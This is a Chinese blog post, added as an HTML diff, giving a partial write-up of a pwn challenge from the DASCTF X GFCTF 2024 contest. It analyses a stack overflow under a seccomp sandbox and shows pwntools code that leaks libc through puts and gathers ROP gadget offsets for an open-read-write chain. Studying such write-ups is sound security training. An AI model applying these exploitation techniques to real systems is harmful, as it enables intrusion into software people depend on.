@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Wgiegie-DASCTF X GFCTF 2024｜四月开启第一局 | 纲的blog</title>
+
+  <!-- keywords -->
+  
+    <meta name="keywords" content="Wgiegie">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="周6打了一个比赛是buuctf上面上的一个比赛，叫“DASCTF X GFCTF 2024｜四月开启第一局”，只持续了一天，不算难，算一个娱乐赛吧，一共有3个pwn题都是栈的题没有堆的题目，漏洞都比较明显，不过每一道题都有有坑的地方，比较考积累。最近一直在搞堆的知识，做题有一点生疏了，以后还是要找一点时间练练题，至少不能让手有生疏。 写这篇文章的时候已经是第二天的晚上了，3道题才做出来1道，也是今">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF X GFCTF 2024｜四月开启第一局">
+<meta property="og:url" content="https://2023478.github.io/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/index.html">
+<meta property="og:site_name" content="纲的blog">
+<meta property="og:description" content="周6打了一个比赛是buuctf上面上的一个比赛，叫“DASCTF X GFCTF 2024｜四月开启第一局”，只持续了一天，不算难，算一个娱乐赛吧，一共有3个pwn题都是栈的题没有堆的题目，漏洞都比较明显，不过每一道题都有有坑的地方，比较考积累。最近一直在搞堆的知识，做题有一点生疏了，以后还是要找一点时间练练题，至少不能让手有生疏。 写这篇文章的时候已经是第二天的晚上了，3道题才做出来1道，也是今">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://2023478.github.io/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421205639232.png">
+<meta property="og:image" content="https://2023478.github.io/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421210942757.png">
+<meta property="og:image" content="https://2023478.github.io/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421213603601.png">
+<meta property="article:published_time" content="2024-04-21T12:41:04.000Z">
+<meta property="article:modified_time" content="2024-04-21T14:23:10.344Z">
+<meta property="article:author" content="wgiegie">
+<meta property="article:tag" content="pwn题解">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://2023478.github.io/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421205639232.png">
+  
+    <link rel="alternative" href="/atom.xml" title="纲的blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/pwn%E9%A2%98%E8%A7%A3/" style="font-size: 13.33px;">pwn题解</a> <a href="/tags/%E5%91%A8%E6%8A%A5/" style="font-size: 20px;">周报</a> <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">搭博客</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-DASCTF-X-GFCTF-2024｜四月开启第一局" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/" class="article-date">
+  	<time datetime="2024-04-21T12:41:04.000Z" itemprop="datePublished">2024-04-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DASCTF X GFCTF 2024｜四月开启第一局
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn%E9%A2%98%E8%A7%A3/" rel="tag">pwn题解</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/CTF/">CTF</a>
+	</div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>周6打了一个比赛是buuctf上面上的一个比赛，叫“DASCTF X GFCTF 2024｜四月开启第一局”，只持续了一天，不算难，算一个娱乐赛吧，一共有3个pwn题都是栈的题没有堆的题目，漏洞都比较明显，不过每一道题都有有坑的地方，比较考积累。最近一直在搞堆的知识，做题有一点生疏了，以后还是要找一点时间练练题，至少不能让手有生疏。</p>
+<p>写这篇文章的时候已经是第二天的晚上了，3道题才做出来1道，也是今天下午才出来的，确实有一点慢了，这周看看能不能把剩下的那两道题也做出来，把wp写了。今天先把做出来的这道题遇到的坑和wp写一写。</p>
+<p><strong>第一题：pwn</strong></p>
+<p>老规矩，先checksec一下程序，还好保护基本没开，可以少考虑一点，那就进ida里找漏洞。</p>
+<p><img src="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421205639232.png" alt="image-20240421205639232"></p>
+<p>在ida中的main函数如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">4</span>]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(buf, <span class="number">0</span>, sizeof(buf));</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, 0x100uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0LL; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)buf + i) == <span class="number">0xF0</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">0xE0</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">0x80</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">80</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;You must want to execute &quot;</span>);</span><br><span class="line">      puts(<span class="string">&quot;open read write puts openat readv writev &quot;</span>);</span><br><span class="line">      puts(<span class="string">&quot;\x1B[31;3;1myou are not allowed to execute!\x1B[0m&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞以经很明显了，用read函数向buf中可以输入长度为0x100的数据但buf到rbp的距离为0x30，明显的栈溢出。再看看其他函数有没有问题，</p>
+<p>在init函数中发现一个问题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void init(void)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(_bss_start, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v0 = seccomp_init(2147418112LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 59LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 322LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 9LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 10LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 41LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 56LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 101LL, 0LL);</span><br><span class="line">  seccomp_load(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显在这个程序中已经开启了沙箱保护，可以看看用沙箱禁了哪些函数</p>
+<p><img src="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421210942757.png" alt="image-20240421210942757"></p>
+<p>看看哪些函数的后面为0013，那些函数便是被禁的函数。被禁的函数还有点多，不过我们主要看有俩个函数</p>
+<p><code>execve</code>和<code>mprotect</code>函数，前者代表不能直接获得shell只能使用orw的方法，第二个函数则代表在这里不能通过提升权限的方法来直接用shellcode，只能orw一个一个函数的调用了，</p>
+<p>那么大致思路便基本出来了，通过栈溢出执行orw将flag打印在屏幕上，那先在看看都有哪些限制和差些什么。</p>
+<p>回到main函数，在输入数据后会有一个循环将输入的数据都遍历一遍，如果检测到有与<code>0xf0,0xe0,0x80,80,0xb0</code>相同的数据便会停止程序，输出一段字。因此在输入的时候要注意避开这几个数，在我做的这里变有一个需要注意的点，可能在有的libc版本中数据不用再意这点，不过远程已经没了，我只是在自己的本地，照本地的libc版本来的，各位看官在自己的本地上打记得要更据自己的libc版本做相应的改变。</p>
+<p>由于使用orw的方法需要大量的pop指令，便来看看程序自带的pop指令，</p>
+<p><img src="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421213603601.png" alt="image-20240421213603601"></p>
+<p>太少了明显不够用，那必须要用的libc中的pop指令，便要知道这个程序中的libc_base（libc的基地址）是多少，将程序中的函数的got地址暴露出来，刚好在程序中有puts函数，那便用puts函数将程序中的puts函数的got地址暴露出来，然后由于在程序中没有再次输入的地方，便要再次回到main函数再次执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">main=<span class="number">0x401386</span>//返回地址，为了继续执行</span><br><span class="line">puts_plt=<span class="number">0x4010D4</span></span><br><span class="line">puts_got=<span class="number">0x404028</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401381</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x401482&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload=flat(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>,p64(pop_rdi_ret),p64(puts_got),p64(puts_plt),p64(main))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_libc=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_libc:&#x27;</span>,<span class="built_in">hex</span>(puts_libc))</span><br></pre></td></tr></table></figure>
+
+<p>在执行完这段命令后便可以知道puts_got的地址，然后根据自身的libc版本中的puts函数的偏移地址，便可以知道libc_base的地址，在根据libc中的其他函数和pop指令的偏移地址，便可以知道所需的函数与pop指令的地址，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#elo=ELF(&#x27;libc6_2.35-0ubuntu3.4_amd64.so&#x27;)</span></span><br><span class="line">elo=ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts=elo.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts))</span><br><span class="line">base_libc=puts_libc-puts</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc:&#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line"></span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>] </span><br><span class="line">read_libc=elo.symbols[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=open_libc+base_libc-<span class="number">1</span></span><br><span class="line">read0=read_libc+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open:&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read0:&#x27;</span>,<span class="built_in">hex</span>(read0))</span><br><span class="line"></span><br><span class="line">buf_flag=<span class="number">0x404090</span>//bss段中的空地址，在之后用来存放<span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">read_plt=<span class="number">0x401100</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x404100</span>//bss段中的空地址，在之后用来存放读取到的flag</span><br><span class="line">pop_rbp_ret=<span class="number">0x4011ed</span></span><br><span class="line">pop_rsi_ret_libc=<span class="number">0x2be51</span></span><br><span class="line">pop_rsi_ret=pop_rsi_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line">pop_rbp_r12_ret_libc=<span class="number">0x35730</span>//一开始忘了程序中有rbp的命令，在后面就没用了</span><br><span class="line">pop_rbp_r12_ret=pop_rbp_r12_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line">pop_rdx_r12_ret_libc=<span class="number">0x904a9</span></span><br><span class="line">//一开始想只用rdx的，发现在我的这里用rdx的会触发之前的那个检测干脆换一个，将r12命令为<span class="number">0</span>就行</span><br><span class="line">pop_rdx_r12_ret=pop_rdx_r12_ret_libc+base_libc</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/04/21/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-15-2024-4-21%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          周报（2024.4.14-2024.4.21）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/04/14/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-8-2024-4-14%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">周报（2024.4.8-2024.4.14）</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="DASCTF-X-GFCTF-2024｜四月开启第一局" data-title="DASCTF X GFCTF 2024｜四月开启第一局" data-url="https://2023478.github.io/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="DASCTF X GFCTF 2024｜四月开启第一局">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2024 wgiegie
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
